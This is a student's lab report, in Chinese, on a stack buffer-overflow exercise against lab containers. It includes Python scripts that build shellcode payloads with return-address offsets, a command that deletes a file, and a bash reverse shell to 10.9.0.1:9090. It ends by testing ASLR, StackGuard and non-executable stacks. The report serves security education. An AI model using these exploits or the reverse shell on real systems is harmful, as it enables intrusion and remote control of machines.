# LAB2 STACK OVERFLOW

## 1. 环境搭建

### 关闭防御措施

![image-20260924190640980](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924190640980.png)

### 编译

![image-20260924191055289](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924191055289.png)

并复制到`bof-containers`文件夹下

### 设置容器

![image-20260924192551981](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924192551981.png)

![image-20260924192612521](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924192612521.png)

## 任务1

在Desktop新建文件`deletion`，编写以下shellcode_32_delete.py用以删除该文件。

```python
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same.
   # The * in this line serves as the position marker         *
   "/bin/rm -rf /home/seed/Desktop/deletion; echo Done!       *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

content = bytearray(200)
content[0:] = shellcode

# Save the binary code to file
with open('codefile_32', 'wb') as f:
  f.write(content)
```

![image-20260924194307427](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924194307427.png)

## 第一关

### 1. 服务器

在攻击者机器上echo hello到server1

![image-20260924200316373](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924200316373.png)

获得 ebp和buffer地址

### 2. 攻击

```python
#!/usr/bin/python3
import sys

shellcode= (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "echo Done! Hacked into server 1!                          *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffd398     # Change this number
offset = 116              # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```

运行后生成badfile。发送给服务器。

![image-20260924202619411](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924202619411.png)

#### 获取反向Shell

修改shellcode为：

```python
"/bin/bash -i >& /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
```

![image-20260924203450868](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924203450868.png)

## 第二关

给`server2`发hello

![image-20260924203752514](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924203752514.png)

获得buffer地址0xffffd348

修改代码

```python
ret = 0xffffd348 + 256     # Change this number
for offset in range(100,256,4):
# Use 4 for 32-bit address and 8 for 64-bit address
   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
```

buffer范围为[100,200]，则在这部分范围内都填上ret，最后生成badfile执行攻击。

![image-20260924210526671](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260924210526671.png)

## 第三关

![image-20261008021711144](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008021711144.png)

rbp-buf=208

offset=208+8=216

ret=buf+100

为了解决`\x00`无法写入的问题，将shellcode放在ret前，将start设为0来达到这个目的

```python
#!/usr/bin/python3
import sys

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/bash -i >& /dev/tcp/10.9.0.1/9090 0<&1 2>&1          *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00007fffffffdf80     # Change this number
offset = 216
# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

攻击成功

 ![image-20261008024936462](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008024936462.png)

## 第四关

---

## 实验地址随机化

开启ASLR

![image-20261008025358909](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008025358909.png)

![image-20261008025509062](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008025509062.png)

![image-20261008025533453](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008025533453.png)

rbp和buf不再是固定的值，这两个地址的随机化导致攻击者无法确定ret，很难攻击

由多次echo可知buffer大小为112固定，buf的取值大概在0xff800000到0xffff0000之间，取ret为0xffb9e00（随便选的中间数），开始暴力破解，未能成功

## 实验其他防护措施

### StackGuard

去除掉Makefiel内的-fno-stack-protector 选项，重新编译

![image-20261008034725134](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008034725134.png)

发送badfile后输出：

![image-20261008034838457](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008034838457.png)

StackGuard检测到了栈被破坏于是终止了程序

### 不可执行栈

在shellcode文件夹的Makefile里去除-z execstack选项，随后重新编译call_shellcode.c

![image-20261008035200217](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008035200217.png)

执行后输出：

![image-20261008035338772](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20261008035338772.png)

由于栈不可执行，所以报了segmentation fault然后终止了程序
